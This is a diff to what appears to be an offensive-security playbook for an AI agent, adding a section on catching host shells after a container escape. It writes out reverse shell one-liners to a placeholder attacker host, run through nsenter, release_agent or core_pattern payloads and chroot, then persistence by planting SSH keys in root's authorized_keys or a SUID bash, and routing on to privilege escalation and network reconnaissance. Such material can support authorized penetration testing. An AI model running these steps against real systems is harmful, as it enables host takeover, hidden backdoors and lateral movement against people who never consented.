@@ -957,6 +957,33 @@ on activation — stale state means duplicate work or missed context.
 ### Escaped to Host
 
 Successfully accessed host filesystem or got a host shell.
+
+#### Reverse Shell via MCP
+
+When a container escape achieves host-level access, **catch the host shell via
+the MCP shell-server** rather than relying on `nsenter` or `chroot` in the
+current terminal. Container escapes often produce shells in different
+namespaces or via asynchronous triggers (release_agent, core_pattern) that the
+agent cannot interact with directly.
+
+1. Call `start_listener(port=4444)` to prepare a catcher on the attackbox
+2. Send a reverse shell from the host context:
+   ```bash
+   # After nsenter to host namespace:
+   nsenter -t 1 -m -u -i -n -p -- bash -c 'bash -i >& /dev/tcp/ATTACKER/PORT 0>&1'
+   # Or in release_agent / core_pattern payload:
+   echo '#!/bin/sh
+   bash -i >& /dev/tcp/ATTACKER/PORT 0>&1' > /cmd
+   # Or after mounting host filesystem:
+   chroot /mnt/host bash -c 'bash -i >& /dev/tcp/ATTACKER/PORT 0>&1'
+   ```
+3. Call `stabilize_shell(session_id=...)` to upgrade to interactive PTY
+4. Verify host-level access with `send_command(session_id=..., command="hostname && cat /etc/hostname")`
+
+If the host lacks outbound connectivity, write an SSH key to
+`/mnt/host/root/.ssh/authorized_keys` and connect from the attackbox, or
+create a SUID bash on the host filesystem and access it from the container.
+
 → **Route to linux-discovery** (Linux host) or **windows-discovery** (Windows host)
    for local privilege escalation.
 → **Route to network-recon** to discover additional targets from the host's
